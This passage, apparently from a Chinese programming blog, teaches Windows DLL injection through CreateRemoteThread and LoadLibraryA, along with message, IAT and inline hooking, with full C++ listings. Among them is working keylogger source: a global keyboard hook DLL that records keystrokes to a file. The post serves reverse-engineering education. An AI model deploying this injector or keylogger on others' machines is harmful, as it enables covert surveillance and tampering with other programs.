class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buffer[] = <span class="string">&quot;.//your//dll&#x27;s//path&quot;</span>;</span><br><span class="line">SIZE_T bufferSize = <span class="built_in">strlen</span>(buffer) + <span class="number">1</span>;</span><br><span class="line">SIZE_T realWrite = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//申请进程内存空间</span></span><br><span class="line"><span class="keyword">char</span>* str = (<span class="keyword">char</span>*)<span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, bufferSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (str == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;malloc err !!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将字符串写入该空间</span></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, str, buffer, bufferSize, &amp;realWrite);</span><br></pre></td></tr></table></figure><p>之后再用str去创建线程传参，就没有问题了；</p><p>完整代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid = <span class="string">&quot;your aim pid&quot;</span>;</span><br><span class="line"><span class="comment">//打开进程</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;open fail !! &quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buffer[] = <span class="string">&quot;.//your//dll&#x27;s//path&quot;</span>;</span><br><span class="line">SIZE_T bufferSize = <span class="built_in">strlen</span>(buffer) + <span class="number">1</span>;</span><br><span class="line">SIZE_T realWrite = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//申请进程内存空间</span></span><br><span class="line"><span class="keyword">char</span>* str = (<span class="keyword">char</span>*)<span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, bufferSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (str == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;malloc err !!&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将字符串写入该空间</span></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, str, buffer, bufferSize, &amp;realWrite);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建进程中的线程</span></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, str, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;thread create err !!&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一直等待线程结束</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//扫尾</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, str, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后写一个dll具体实现，就能将其注入了；</p><h2 id="HOOK"><a href="#HOOK" class="headerlink" title="HOOK"></a>HOOK</h2><p>钩子，和网络上的抓包很类似，在上下文中设置hook，即可捕获了解到其中的执行信息；</p><h3 id="消息-hook"><a href="#消息-hook" class="headerlink" title="消息 hook"></a>消息 hook</h3><p>你已经知道windows是基于消息操作的，也可以叫基于事件操作，那么将钩子设置在消息队列和进程之间的消息传输中，就叫消息hook；</p><p>windows提供了消息hook的API，只需要会用就行；</p><table><thead><tr><th>API</th><th>作用</th></tr></thead><tbody><tr><td>SetWindowsHookEx</td><td>设置钩子</td></tr><tr><td>CallNextHookEx</td><td>传递钩子信息到钩子链的下一个子程序</td></tr><tr><td>UnHookWindowsHookEx</td><td>卸载钩子</td></tr></tbody></table><p>其中有个特点需要了解：</p><p>进程如果被hook，那么<strong>有关其hook的dll会被强制归属于该进程</strong>，所以hook一般也写在dll中，也是一种dll注入的手段；</p><p>来看一个键盘记录器的实际代码；</p><p>首先是dll程序主函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,<span class="comment">//实例句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,<span class="comment">//调用原因或可以说是时机</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved<span class="comment">//保留字段</span></span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:<span class="comment">//创建进程时执行</span></span><br><span class="line">            g_hInstance = hModule;<span class="comment">//之后hook函数需要用到的实例句柄</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后分别是hook的设置，处理，以及卸载；</p><p>设置HOOK：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//填0全局hook，这里选用键盘消息的勾取</span></span><br><span class="line">    g_hHook = <span class="built_in">SetWindowsHookExA</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (g_hHook)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用回调函数处理捕获信息：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ <span class="keyword">int</span>    code,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (code == HC_ACTION)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//键帽按下状态</span></span><br><span class="line">        <span class="keyword">if</span> ((lParam &amp; <span class="number">0x80000000</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//将虚拟键转换为字符</span></span><br><span class="line">            BYTE KeyState[<span class="number">256</span>]&#123; <span class="number">0</span> &#125;;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">GetKeyboardState</span>(KeyState))</span><br><span class="line">            &#123;</span><br><span class="line">                LONG keyinfo = lParam;</span><br><span class="line">                UINT keyCode = (keyinfo &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x00ff</span>;</span><br><span class="line">                WCHAR wkeyCode = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">ToAscii</span>((UINT)wParam, keyCode, KeyState, (LPWORD)&amp;wkeyCode, <span class="number">0</span>);</span><br><span class="line">                CHAR strinfo[<span class="number">12</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">                <span class="built_in">sprintf_s</span>(strinfo, _countof(strinfo), <span class="string">&quot;%c&quot;</span>, wkeyCode);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//写到桌面，这样仅仅对ascii实用</span></span><br><span class="line">                FILE* fp = <span class="literal">NULL</span>;</span><br><span class="line">                <span class="built_in">fopen_s</span>(&amp;fp, <span class="string">&quot;C://your//path//to//Desktop//hook_log.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">                <span class="built_in">fwrite</span>(strinfo, <span class="number">1</span>, <span class="number">1</span>, fp);</span><br><span class="line">                <span class="built_in">fclose</span>(fp);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//不处理给下一个钩子，类似于窗口的回调函数最后返回</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">CallNextHookEx</span>(g_hHook, code, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>卸载钩子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">UnInstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">UnhookWindowsHookEx</span>(g_hHook);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，一个拥有消息hook的dll文件产生了，再使用任意主程序调用即可；</p><h3 id="IAT-hook"><a href="#IAT-hook" class="headerlink" title="IAT hook"></a>IAT hook</h3><p>顾名思义，此hook是对于IAT而言，IAT即 import address table ，导入地址表，在程序变为进程时，此表存储了导入函数的地址，在磁盘形态时存储的则是其函数名称，或者序号；</p><p>利用该hook可以使得改变原程序调用函数为自定义函数，当然<strong>传参需要一致，调用约定需要一致</strong>；</p><p>先回顾下 IAT 结构：</p><p>先拿DOS头找到PE头，接着拿PE头找可选PE头，可选头最后一个字段是一个数组，其存放各种表的 rva；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DATA_DIRECTORY &#123;</span><br><span class="line">    DWORD   VirtualAddress;                 <span class="comment">// +0000h   -   数据的起始RVA</span></span><br><span class="line">    DWORD   Size;                           <span class="comment">// +0004h   -   数据块的长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下标为1的元素即为导入表，利用rva跳转到表本身，同时注意表有多个，因为导入的dll会是多个，所以记得循环遍历；</p><p>导入表中的 FirstThunk即为 IAT，同时注意，IAT有多个函数地址，也需要一次循环遍历；</p><p><img src="https://s2.loli.net/2022/12/12/IEzTfDBN3FMZl7m.png" alt="IAT"></p><p>由此，寻找函数地址的函数为：（输入dll名和函数名以查询）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//32位程序用DWORD</span></span><br><span class="line"><span class="function">DWORD* <span class="title">GetIatAddr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* dllName, <span class="keyword">const</span> <span class="keyword">char</span>* dllFunName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取本进程的句柄，也就是载入的exe文件</span></span><br><span class="line">    HMODULE hModule = <span class="built_in">GetModuleHandleA</span>(<span class="number">0</span>);</span><br><span class="line">    DWORD buffer = (DWORD)hModule;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取DOS头</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line">    <span class="comment">//获取PE头</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);</span><br><span class="line">    <span class="comment">//获取可选头</span></span><br><span class="line">    PIMAGE_OPTIONAL_HEADER pOptionalHeader = &amp;pNtHeader-&gt;OptionalHeader;</span><br><span class="line">    <span class="comment">//获取那个结构体数组</span></span><br><span class="line">    PIMAGE_DATA_DIRECTORY dataDirectory = &amp;pOptionalHeader-&gt;DataDirectory[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">//获取导入表</span></span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)(dataDirectory-&gt;VirtualAddress + buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历导入表</span></span><br><span class="line">    <span class="keyword">while</span> (pImportTable-&gt;Name)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span>* name = (<span class="keyword">char</span> *)(pImportTable-&gt;Name + buffer);</span><br><span class="line">        <span class="comment">//是否dll名相同</span></span><br><span class="line">        <span class="keyword">if</span> (!_stricmp(name, dllName))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//根据名字拿地址</span></span><br><span class="line">            <span class="comment">//获取INT</span></span><br><span class="line">            PIMAGE_THUNK_DATA pINT = (PIMAGE_THUNK_DATA)(pImportTable-&gt;OriginalFirstThunk + buffer);</span><br><span class="line">            <span class="comment">//获取IAT</span></span><br><span class="line">            PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(pImportTable-&gt;FirstThunk + buffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//同步遍历INT和IAT</span></span><br><span class="line">            <span class="keyword">while</span> (pINT-&gt;u1.Function)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//按名导入</span></span><br><span class="line">                <span class="keyword">if</span> ((pINT-&gt;u1.Ordinal &amp; <span class="number">0x80000000</span>) == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    PIMAGE_IMPORT_BY_NAME pImportName = (PIMAGE_IMPORT_BY_NAME)(pINT-&gt;u1.Function + buffer);</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(pImportName-&gt;Name, dllFunName))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">return</span> (DWORD*)pIAT;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                pINT++;</span><br><span class="line">                pIAT++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        pImportTable++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着便是dllMain：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//创建进程时获取函数地址，此次修改的函数是MessageBoxW</span></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;注入成功！\n&quot;</span>);</span><br><span class="line">            <span class="comment">//获取函数地址</span></span><br><span class="line">            g_iatAddr = <span class="built_in">GetIatAddr</span>(<span class="string">&quot;user32.dll&quot;</span>, <span class="string">&quot;MessageBoxW&quot;</span>);</span><br><span class="line">            g_preIatAddr = g_iatAddr;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置钩子</span></span><br><span class="line">            <span class="built_in">InstallHook</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//进程结束时卸载钩子</span></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">            <span class="comment">//卸载钩子</span></span><br><span class="line">            <span class="built_in">UnInstallHook</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//更改IAT处可写权限</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>(g_iatAddr, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">//更改函数地址</span></span><br><span class="line">    *g_iatAddr = (DWORD)Hack;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(g_iatAddr, <span class="number">4</span>, oldProtect, &amp;oldProtect);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnInstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//更改IAT处可写权限</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>(g_iatAddr, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">//还原更改的IAT</span></span><br><span class="line">    *g_iatAddr = (DWORD)g_preIatAddr;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(g_iatAddr, <span class="number">4</span>, oldProtect, &amp;oldProtect);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Inline-hook"><a href="#Inline-hook" class="headerlink" title="Inline hook"></a>Inline hook</h3><p>IAT hook 是有缺陷的，即若导入函数无名就会失去作用；</p><p>而知道的是，IAT hook 的主要思路就是<strong>改变所hook函数的地址</strong>；</p><p>既然要hook一个函数，那么这个函数一定会调用，则inline hook 的主旨便是：</p><p>在<strong>进入目标函数时执行跳转</strong>，跳转到自实现函数里去；意思就是更改其第一条汇编码为 <code>jmp aimAddr</code> ;</p><p>具体实现则是更改其第一条指令对应的硬编码，也就是机械码，二进制内容；</p><p>对于<strong>32位程序的x86</strong>而言，jmp指令会占 5 个字节，第一个固定 E9 为 jmp指令，后面跟随的4个字节为偏移；</p><p>该偏移的计算公式为 ： offset = aimAddr - jmp指令的下一条地址;</p><p>也就是           ： <strong>offset = aimAddr - jmp指令地址 - 5</strong>;</p><p>那么主要的dll构造思路为：</p><ol><li>拿到目标函数地址，存档其前5字节内容，因为要恢复；</li><li>算出偏移并更改目标地址前5字节内容为跳转；</li><li>执行自实现函数的处理部分；</li><li>恢复5字节内容；</li></ol><p>由此全局存储变量：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分别是目标函数地址，保留5字节和修改5字节</span></span><br><span class="line">DWORD aimAddr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> oldBytes[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> newBytes[<span class="number">5</span>] = &#123; <span class="number">0xE9</span> &#125;;</span><br></pre></td></tr></table></figure><p>则有初始化函数实现思路中 1，2 中的算偏移：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InitHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hModule = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hModule == <span class="number">0</span>) <span class="keyword">return</span> FALSE;</span><br><span class="line">    <span class="comment">//获取真实的地址</span></span><br><span class="line">    aimAddr = (DWORD)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;MessageBoxW&quot;</span>);</span><br><span class="line">    <span class="comment">//保留5字节</span></span><br><span class="line">    <span class="built_in">memcpy</span>(oldBytes, (<span class="keyword">char</span>*)aimAddr, <span class="number">5</span>);</span><br><span class="line">    <span class="comment">//偏移搞定，hack为自定义函数</span></span><br><span class="line">    DWORD offset = (DWORD)Hack - aimAddr - <span class="number">5</span>;</span><br><span class="line">    <span class="comment">//修改5字节</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;newBytes[<span class="number">1</span>], &amp;offset, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>装载和卸载钩子以实现 2，4：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((DWORD*)aimAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">//修改为跳转</span></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">char</span>*)aimAddr, newBytes, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((DWORD*)aimAddr, <span class="number">5</span>, oldProtect, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnInstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((DWORD*)aimAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">//恢复</span></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">char</span>*)aimAddr, oldBytes, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((DWORD*)aimAddr, <span class="number">5</span>, oldProtect, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后由自定义函数实现思路 3：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 